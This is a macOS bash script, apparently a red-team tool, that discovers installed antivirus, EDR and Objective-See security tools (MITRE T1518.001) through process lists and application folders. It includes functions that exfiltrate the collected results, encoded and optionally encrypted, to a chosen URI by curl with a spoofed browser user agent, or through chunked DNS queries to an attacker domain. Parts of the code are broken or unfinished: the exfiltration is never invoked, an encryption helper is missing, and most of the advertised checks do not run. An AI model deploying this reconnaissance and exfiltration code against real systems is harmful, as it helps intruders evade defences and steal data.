

#Name: security_sofware.sh
# TTP: Security Software Discovery
# TTP ID: T1518.001
# Tactic: Discovery
# Platform: macOS
# Permissions Required: User
# Author: @darmado x.com/darmad0
# Date: 2024-09-23
# Version: 1.1

# Description: This script discovers security software installed on a macOS system,
# including antivirus, firewall, and other security tools. It checks for running
# proc, installed applications, and system configurations related to security
# software.

# Usage: ./security_software.sh [options]
# Options:
#   --help                 Display this help message
#   --verbose              Enable verbose output
#   --log                  Enable logging of output to a file
#   --all                  Run all security software checks
#   --edr=OPTION           Check specific EDR component (ps|files|config)
#   --fw             Check firewall status
#   --hids                 Check for HIDS
#   --av=OPTION     Check specific antivirus component (ps|files|config)
#   --gk           Check Gatekeeper status
#   --xp             Check XProtect status
#   --mrt=OPTION           Check specific MRT component (ps|files|config)
#   --tcc                  Check TCC (Transparency, Consent, and Control) status
#   --ost=OPTION Check specific opensource security tool components (ps|files|info)
#   --encode=TYPE          Encode output (b64|hex)
#   --encrypt=METHOD       Encrypt output (aes-256-cbc, bf, etc.). Generates a random key.
#   --exfil=URI            Exfiltrate output to URI using HTTP POST
#   --exfil=dns=DOMAIN     Exfiltrate output via DNS queries to DOMAIN
#   --sudo                 Enable sudo mode for operations requiring elevated privileges

# Note: This script is intended for educational and authorized testing purposes only.
# Ensure you have proper permissions before running on any system.

# Global variables
NAME="security_software"
TTP_ID="T1518.001"
LOG_FILE="${TTP_ID}_${NAME}.log"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
ALL=false
EDR_CHECK=""
AV_CHECK=""
MRT_CHECK=""
FIREWALL=false
HIDS=false
GATEKEEPER=false
XPROTECT=false
TCC=false
SUDO_MODE=false

# Command variables
CMD_LS_APP_FILES='ls -laR /Applications/'
CMD_LS_APP_DIR='ls -d /Applications/'
CMD_PS='ps -axrww | grep -v grep| grep --color=always'
CMD_SP_APP='system_profiler SPApplicationsDataType | grep --color=always -A 8 '

# Arrays to store checks
EDR=()
AV=()
MRT=()
OST=()


cmd_ls_app_files() {
    $CMD_LS_APP_FILES"$1" 2>/dev/null
}

cmd_ls_app_dir() {
   $CMD_LS_APP_DIR"$1" 2>/dev/null
}

#TODO: i dont like  this is eval, but it works for now
# We use eval because we're passing a variable that contains pipes
cmd_sp_app() {
    eval "$CMD_SP_APP '$1'"  2>&1
}

cmd_ps() {
    eval "$CMD_PS '$1'" 2>&1
}

# AV vendor data
AV_VENDOR_PROC=(
    "MacKeeper:MacKeeper,MacKeeperAgent,com.mackeeper.MacKeeperPrivilegedHelper"
    "Malwarebytes:RTProtectionDaemon,FrontendAgent,SettingsDaemon"
    "Avast:AvastUI"
    "AvastBusinessAntivirus:AvastBusinessUI"
    "AvastFreeAntivirusforMac:AvastFreeUI"
    "AvastSecurity:AvastSecurityUI"
    "Avira:AviraUI"
    "AviraAntivirus:AviraAntivirusUI"
    "AviraFreeAntivirusforMac:AviraFreeUI"
    "Bitdefender:bdmd"
    "BitdefenderAntivirusforMac:bdmd"
    "BitdefenderAntivirusFree:bdmd"
    "BitdefenderGravityZone:bdmd"
    "ESET:ec_service"
    "ESETCyberSecurityforMac:ec_service"
    "ESETNOD32:ESETNOD32Service"
   # "F-Secure:F-Secure\ Service" ##TODO: Buggy due to spaces in the name
    "F-SecureElements:FSElementsService"
    "Kaspersky:kavsvc"
    "KasperskyFreeAntivirusforMac:kavsvc"
    "KasperskySecurityCloud:kavsvc"
    "MicrosoftDefender:Defender"
    "Norton360:Norton360Service"
    "PandaAdaptiveDefense:PandaAdaptiveService"
    "PandaSecurity:PandaService"
    "Proofpoint:ProofpointAgent"
    "Webroot:WRSAService"
    "WebrootBusinessEndpointProtection:WRBusinessService"
    "WebrootSecureAnywhere:WRSAService"
)

AV_VENDOR_APP=(
    "MacKeeper.app"
    "Avast.app"
    "AvastBusiness.app"
    "AvastFree.app"
    "AvastSecurity.app"
    "Avira.app"
    "AviraAntivirus.app"
    "AviraFree.app"
    "Bitdefender.app"
    "BitdefenderMac.app"
    "BitdefenderFree.app"
    "GravityZone.app"
    "ESET.app"
    "CyberSecurity.app"
    "NOD32.app"
    "F-Secure.app"
    "Elements.app"
    "Kaspersky.app"
    "KasperskyFree.app"
    "SecurityCloud.app"
    "Microsoft Defender.app"
    "Norton360.app"
    "PandaAdaptive.app"
    "Panda.app"
    "Proofpoint.app"
    "Webroot.app"
    "WebrootBusiness.app"
    "WebrootSecureAnywhere.app"
    "Malwarebytes.app"
)

# EDR vendor data
EDR_VENDOR_PROC=(
    "CrowdStrike:falconctl,falcon-sensor"
    "CarbonBlack:cbdaemon,cbagent"
    "SentinelOne:SentinelAgent,SentinelService"
    "Cylance:CylanceSvc,CylanceUI"
    "FireEye:FireEyeAgent,FireEyeService"
    "CiscoAMP:ampdaemon,ampservice"
    "PaloAlto:CortexService,TrapsService"
    "MicrosoftDefender:mds,mdatp"
    "TrendMicroApexOne:ds_agent,tmlisten"
    "SophosInterceptX:sophosd,sophosservice"
    "McAfee:mcafeeagent,mcafeed"
)

EDR_VENDOR_APP=(
    "CrowdStrike.app"
    "CarbonBlack.app"
    "SentinelOne.app"
    "Cylance.app"
    "FireEye.app"
    "CiscoAMP.app"
    "Cortex XDR.app"
    "Microsoft Defender.app"
    "TrendMicroSecurity.app"
    "Sophos_Endpoint.app"
    "McAfee _ndpoint Security for Mac.app"
)

# Objective-See and additional macOS security tools
OST_PROC=(
    "BlockBlock:blockblock"
    "DoNotDisturb:DoNotDisturb"
    "LuLu:LuLu"
    "KnockKnock:KnockKnockDaemon"
    "OverSight:OverSight"
    "RansomWhere:RansomWhere"
)

OST_APP=(
    "BlockBlock.app"
    "DoNotDisturb.app"
    "LuLu.app"
    "KnockKnock.app"
    "OverSight.app"
    "RansomWhere.app"
)


display_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Description:"
    echo "  Discovers security software on macOS using native tools (T1518.001)."
    echo ""
    echo "Options:"
    echo "  General:"
    echo "    --help                 Show this help message"
    echo "    --verbose              Enable detailed output"
    echo "    --log                  Log output to file (rotates at 5MB)"
    echo "    --all                  Run all checks"
    echo ""
    echo "  EDR/AV:"
    echo "    --edr=OPTION           Check EDR (ps|files|dir|info) using ps, ls, system_profiler"
    echo "    --av=OPTION            Check antivirus (ps|files|dir|info) using ps, ls, system_profiler"
    echo ""
    echo "  Open Source Tools:"
    echo "    --ost=OPTION           Check Objective-See tools (ps|files|info) using ps, ls, system_profiler"
    echo ""
    echo "  System Security:"
    echo "    --fw                   Check Application Firewall using socketfilterfw"
    echo "    --hids                 Check for HIDS using ls, ps"
    echo "    --xp                   Check XProtect using system_profiler, ls"
    echo "    --mrt=OPTION           Check MRT (ps|files|config) using ps, ls, defaults"
    echo "    --gk                   Check Gatekeeper using spctl"
    echo "    --tcc                  Check TCC using tccutil"
    echo ""
    echo "  Output Processing:"
    echo "    --encode=TYPE          Encode output (b64|hex) using base64 or xxd"
    echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
    echo ""
    echo "  Data Exfiltration:"
    echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig, splits data into chunks (RFC 1035)"
}
check_antivirus() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "ps")
            output+="Process Check:\n"
            for entry in "${AV_VENDOR_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    result=$(cmd_ps "$proc")
                    if [ -n "$result" ]; then
                        output+="$result\n"
                    fi
                done
            done
            ;;
        "files")
            output+="Files Check:\n"
            for app_name in "${AV_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_files "$app_name")
                if [ -n "$result" ]; then
                    output+="$result\n"
                fi
            done
            ;;
        "dir")
            output+="Directory Check:\n"
            for app_name in "${AV_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_dir "$app_name")
                if [ -n "$result" ]; then
                    output+="$result\n"
                fi
            done
            ;;
        "info")
            output+="Info Check:\n"
            for app_name in "${AV_VENDOR_APP[@]}"; do
                if app_path=$(cmd_ls_app_dir "$app_name"); then
                    app_name_colon="${app_name/.app/:}"
                    result=$(cmd_sp_app "$app_name_colon")
                    if [ -n "$result" ]; then
                        output+="$result\n"
                    fi
                fi
            done
            ;;
        *)
            output+="Unknown check type: $check_type\n"
            ;;
    esac

    echo "$output"
}

check_edr() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "ps")
            for entry in "${EDR_VENDOR_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    result=$(cmd_ps "$proc")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                done
            done
            ;;
        "files")
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_files "$edr_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "dir")
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_dir "$edr_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "info")
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                if cmd_ls_app_dir "$edr_name" > /dev/null 2>&1; then
                    edr_name_colon="${edr_name/.app/:}"
                    result=$(cmd_sp_app "$edr_name_colon")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                fi
            done
            ;;
        *)
            return 1
            ;;
    esac

    echo "$output"
}

check_ost() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "ps")
            for entry in "${OST_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    result=$(cmd_ps "$proc")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                done
            done
            ;;
        "files")
            for ost_name in "${OST_APP[@]}"; do
                result=$(cmd_ls_app_files "$ost_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "dir")
            for ost_name in "${OST_APP[@]}"; do
                result=$(cmd_ls_app_dir "$ost_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "info")
            for ost_name in "${OST_APP[@]}"; do
                if cmd_ls_app_dir "$ost_name" > /dev/null 2>&1; then
                    ost_name_colon="${ost_name/.app/:}"
                    result=$(cmd_sp_app "$ost_name_colon")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                fi
            done
            ;;
        *)
            return 1
            ;;
    esac

    echo "$output"
}

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64|base64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

exfiltrate_http() {
    local data="$1"
    local uri="$2"
    if [ -z "$data" ]; then
        echo "No data to exfiltrate" >&2
        return 1
    fi
    if [ "$ENCRYPT" != "none" ]; then
        data=$(encrypt_data "$data" "$ENCRYPT" "$ENCRYPT_KEY")
        encoded_key=$(echo "$ENCRYPT_KEY" | base64 | tr '+/' '-_' | tr -d '=')
    fi
    encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Determine if we're using HTTPS
    if [[ "$uri" == https://* ]]; then
        curl_opts="--insecure"
    else
        curl_opts=""
    fi
    
    local full_uri="$uri?d=$encoded_data"
    if [ "$ENCRYPT" != "none" ]; then
        full_uri="${full_uri}&_k=$encoded_key"
    fi
    
    if [ "$VERBOSE" = true ]; then
        echo "Exfiltrating data to $uri"
        curl -v $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri"
    else
        curl -s $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri" > /dev/null 2>&1
    fi
}

exfiltrate_dns() {
    local data=$1
    local domain=$2
    local id=$3
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local chunk_size=63  # Max length of a DNS label

    # Send the ID first
    dig +short "${encoded_id}.id.$domain" A > /dev/null

    # Then send the data in chunks
    local i=0
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null
        i=$((i+1))
    done
    # Send a final chunk to indicate end of transmission
    dig +short "end.$domain" A > /dev/null
}

setup_log() {
    local script_name=$(basename "$0" .sh)
    touch "$LOG_FILE"
}

log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        setup_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        setup_log
    fi
}

#log output
log_and_append() {
    local result="$1"
    
    # Only log if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        echo "$result" >> "$LOG_FILE"
    fi
}



# Argument parsing
while [ "$#" -gt 0 ]; do
    case "$1" in
        --help) display_help; exit 0 ;;
        --verbose) VERBOSE=true ;;
        --log) LOG_ENABLED=true ;;
        --all) ALL=true ;;
        --edr=*) EDR_CHECK="${1#*=}" ;;
        --fw) FIREWALL=true ;;
        --hids) HIDS=true ;;
        --av=*) AV+=("${1#*=}") ;;
        --gk) GATEKEEPER=true ;;
        --xp) XPROTECT=true ;;
        --mrt=*) MRT_CHECK="${1#*=}" ;;
        --tcc) TCC=true ;;
        --ost=*) OST+=("${1#*=}") ;;
        --encode=*) ENCODE="${1#*=}" ;;
        --encrypt=*) ENCRYPT="${1#*=}"; ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/') ;;
        --exfil=*) EXFIL=true; EXFIL_METHOD="${1#*=}"; EXFIL_URI="${1#*=dns=}" ;;
        --sudo) SUDO_MODE=true ;;
        *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

main() {
    local output=""
    local separator=$'\n---\n'

    if [ "$ALL" = true ] || [ ${#EDR[@]} -gt 0 ] || [ ${#AV[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
       [ ${#MRT[@]} -gt 0 ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
       [ "$TCC" = true ] || [ ${#OST[@]} -gt 0 ]; then
        
        local av_output=""
        for av_tool in "${AV[@]}"; do
            av_output+="${separator}Antivirus Check ($av_tool):${separator}"
            av_output+=$(check_antivirus "$av_tool")
        done
        output+="$av_output"

        local ost_output=""
        for ost_tool in "${OST[@]}"; do
            ost_output+="${separator}OST Check ($ost_tool):${separator}"
            ost_output+=$(check_ost "$ost_tool")
        done
        output+="$ost_output"

        # ... (similar changes for other checks)
    else
        display_help
        exit 0
    fi

    if [ -n "$output" ]; then
        echo "$output"
    else
        echo "No security software information found"
    fi
}

main
